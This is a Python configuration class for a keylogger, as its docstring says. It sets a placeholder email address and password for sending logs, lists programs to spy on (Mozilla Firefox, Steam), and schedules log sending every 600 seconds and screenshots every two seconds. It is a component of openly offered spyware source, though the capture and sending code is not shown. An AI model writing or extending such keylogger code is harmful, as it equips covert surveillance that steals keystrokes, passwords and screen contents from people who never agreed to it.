class Config:

    __email = "name@gmail.com"
    __password = "passwd"
    __spy_these_programs = ["Mozilla Firefox", "Steam"]
    __send_logs = True
    __send_logs_every = 600.0  # In seconds
    __take_screenshots = True
    __time_between_screenshots = 2.0  # In seconds

    @classmethod
    def get_email(cls):
        return cls.__email

    @classmethod
    def get_password(cls):
        return cls.__password

    @classmethod
    def get_spy_these_programs(cls):
        programs = map(lambda string: string.lower(), cls.__spy_these_programs)
        return list(programs)

    @classmethod
    def get_send_logs(cls):
        return cls.__send_logs

    @classmethod
    def get_send_logs_every(cls):
        return cls.__send_logs_every

    @classmethod
    def get_take_screenshots(cls):
        return cls.__take_screenshots

    @classmethod
    def get_time_between_screenshots(cls):
        return cls.__time_between_screenshots

    @classmethod
    def get_config(cls):
        """
        This function returns a dictionary with the configuration provided by the user for the keylogger.

        :return: Dictionary with a config for the keylogger
        """

        config = {"email": cls.get_email(),
                  "password": cls.get_password(),
                  "spy_these_programs": cls.get_spy_these_programs(),
                  "send_logs": cls.get_send_logs(),
                  "send_logs_every": cls.get_send_logs_every(),
                  "take_screenshots": cls.get_take_screenshots(),
                  "time_between_screenshots": cls.get_time_between_screenshots()}

        return config
